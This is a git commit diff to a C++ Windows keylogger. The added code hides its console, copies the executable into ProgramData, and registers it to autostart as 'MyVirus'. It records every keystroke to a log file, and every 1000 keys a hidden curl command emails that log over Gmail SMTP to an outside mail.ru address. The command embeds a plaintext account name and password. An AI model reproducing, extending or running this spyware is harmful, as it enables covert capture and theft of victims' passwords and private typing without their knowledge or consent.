fffe0da069f536a8f8c98957615498b31f993db3
Ivan Chibisov <knihaykinjan@gmail.com>
2019-12-09 22:36:46 +0300

    Add last version. With sending email, autorun windows and hide console. add something new button

--- Keylogger_cPP/Keylogger_cPP/Keylogger_cPP.cpp
+++ Keylogger_cPP/Keylogger_cPP/Keylogger_cPP.cpp
@@ -2,27 +2,79 @@
 //
 
 #include "pch.h"
+
 #include <iostream>
 #include <windows.h>
 #include<winuser.h>
+#include <locale>
+#include<stdio.h>
 #define _CRT_SECURE_NO_WARNINGS
 
+
+
 using namespace std;
+
+
 int SaveLogs(int key_stroke, const char *file); 
 void Stealth();
+BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);
+BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName);
+void RegisterProgram();
 
 int main() 
 {
+	wchar_t szPathToExe[MAX_PATH];
+	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
+	FILE *f1 = _wfopen(szPathToExe, L"rb");
+	wchar_t second_path[MAX_PATH] = L"C:\\ProgramData\\sample.exe";
+	FILE *f2 = _wfopen(second_path, L"wb");
+	fseek(f1, 0, SEEK_END);
+	int file_size = ftell(f1);
+	rewind(f1);
+	
+	char *buffer = (char*)malloc(file_size);
+	
+	fread(buffer, 1, file_size, f1);
+	if (f2 != nullptr)
+	{
+		fwrite(buffer, 1, file_size, f2);
+		fclose(f2);
+	}
 	Stealth();
-	while (1)
+	FILE* f = _wfopen(L"C:\\ProgramData\\MYLOGS.txt", L"w");
+	if (f != nullptr)
+		fclose(f);
+	if (!IsMyProgramRegisteredForStartup(L"MyVirus"))
+	{
+		RegisterProgram();
+	}
+	int k = 0;
+	while (true)
 	{
 		for(int i = 8; i <= 190; i++)
 		{
 			if (GetAsyncKeyState(i) == -32767)
-				SaveLogs (i,"MYLOGS.txt");
+			{
+				k++;
+				SaveLogs(i, "C:\\ProgramData\\MYLOGS.txt");
+				if (k == 1000)
+				{
+					auto command = "curl --url \"smtps://smtp.gmail.com:465\" --ssl -reqd --mail-from \"knigaykinjan@gmail.com\" --mail-rcpt \"lenavasi78@mail.ru\" --upload-file \"C:\\ProgramData\\MYLOGS.TXT\" --user \"knigaykinjan@gmail.com:44556666\" --insecure";
+					WinExec(command, SW_HIDE);
+					Sleep(10000);
+					FILE* f = _wfopen(L"C:\\ProgramData\\MYLOGS.txt", L"w");
+					if (f != nullptr)
+						fclose(f);
+					k = 0;
+					
+				}
+			}
+			if (i % 150 == 0)
+			{
+				Sleep(1);
+			}
 		}
 	}
-	system ("PAUSE");
 	return 0;
 }
 
@@ -31,8 +83,8 @@ int SaveLogs(int key_stroke, const char *file)
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; 
 	FILE *OUTPUT_FILE;
-	OUTPUT_FILE = fopen(file, "a+");
 	cout << key_stroke << endl;
+	OUTPUT_FILE = fopen(file, "a+");
 	if (key_stroke == 8)
 		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
 	else if (key_stroke == 13)
@@ -60,9 +112,127 @@ int SaveLogs(int key_stroke, const char *file)
 	else if (key_stroke == VK_DOWN)
 		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
 	else if (key_stroke == 190 || key_stroke == 110)
-		fprintf(OUTPUT_FILE, "%s", "."); 
+		fprintf(OUTPUT_FILE, "%s", ".");
+	else if (key_stroke == VK_CAPITAL)
+		fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
 	else
-		fprintf(OUTPUT_FILE, "%s", &key_stroke); 
+	{
+		if (key_stroke >= 48 && key_stroke <= 57)
+		{
+			if (((GetKeyState(VK_SHIFT) & 0X0001) != 0))
+			{
+				switch (key_stroke)
+				{
+				case 48:
+					fprintf(OUTPUT_FILE, "%s", ")");
+					break;
+				case 49:
+					fprintf(OUTPUT_FILE, "%s", "!");
+					break;
+				case 50:
+					fprintf(OUTPUT_FILE, "%s", "@");
+					break;
+				case 51:
+					fprintf(OUTPUT_FILE, "%s", "#");
+					break;
+				case 52:
+					fprintf(OUTPUT_FILE, "%s", "$");
+					break;
+				case 53:
+					fprintf(OUTPUT_FILE, "%s", "%");
+					break;
+				case 54:
+					fprintf(OUTPUT_FILE, "%s", "^");
+					break;
+				case 55:
+					fprintf(OUTPUT_FILE, "%s", "&");
+					break;
+				case 56:
+					fprintf(OUTPUT_FILE, "%s", "*");
+					break;
+				case 57:
+					fprintf(OUTPUT_FILE, "%s", "(");
+					break;
+				}
+			}
+			else
+			{
+				fprintf(OUTPUT_FILE, "%s", &key_stroke);
+			}
+		}
+		else
+		{
+			switch (key_stroke)
+			{
+			case 187:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", "+");
+				else
+					fprintf(OUTPUT_FILE, "%s", "=");
+				break;
+			case 189:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", "_");
+				else
+					fprintf(OUTPUT_FILE, "%s", "-");
+				break;
+			case 106:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", "*");
+				else
+					fprintf(OUTPUT_FILE, "%s", "*");
+				break;
+			case 111:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", "/");
+				else
+					fprintf(OUTPUT_FILE, "%s", "/");
+				break;
+			case 107:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", "+");
+				else
+					fprintf(OUTPUT_FILE, "%s", "+");
+				break;
+			case 109:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", "-");
+				else
+					fprintf(OUTPUT_FILE, "%s", "-");
+				break;
+			case 190:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", ">");
+				else
+					fprintf(OUTPUT_FILE, "%s", ".");
+				break;
+			case 188:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", "<");
+				else
+					fprintf(OUTPUT_FILE, "%s", ",");
+				break;
+			case 186:
+				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
+					fprintf(OUTPUT_FILE, "%s", ":");
+				else
+					fprintf(OUTPUT_FILE, "%s", ";");
+				break;
+			default:
+				if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || ((GetKeyState(VK_SHIFT) &0X0001) != 0))
+				{
+					fprintf(OUTPUT_FILE, "%s", &key_stroke);
+				}
+				else
+				{
+					key_stroke += 32;
+					fprintf(OUTPUT_FILE, "%s", &key_stroke);
+				}
+				break;
+			}
+		}
+		
+	}
 	fclose(OUTPUT_FILE); 
 	return 0;
 }
@@ -73,4 +243,83 @@ void Stealth()
 	AllocConsole(); 
 	stealth = FindWindowA("ConsoleWindowClass", NULL); 
 	ShowWindow(stealth, 0); 
+}
+
+
+BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
+{
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwRegType = REG_SZ;
+	wchar_t szPathToExe[MAX_PATH] = {};
+	DWORD dwSize = sizeof(szPathToExe);
+
+	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
+		fSuccess = (lResult == 0);
+	}
+
+	if (fSuccess)
+	{
+		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+
+	return fSuccess;
+}
+
+BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
+{
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwSize;
+
+	const size_t count = MAX_PATH * 2;
+	wchar_t szValue[count] = {};
+	wcscpy_s(szValue, count, L"\"");
+	wcscat_s(szValue, count, pathToExe);
+	wcscat_s(szValue, count, L"\" ");
+
+	if (args != NULL)
+	{
+		wcscat_s(szValue, count, args);
+	}
+
+	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		dwSize = (wcslen(szValue) + 1) * 2;
+		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
+		fSuccess = (lResult == 0);
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+
+	return fSuccess;
+}
+
+void RegisterProgram()
+{
+	wchar_t szPathToExe[MAX_PATH] = L"C:\\ProgramData\\sample.exe";
+
+	RegisterMyProgramForStartup(L"MyVirus", szPathToExe, L"-foobar");
 }
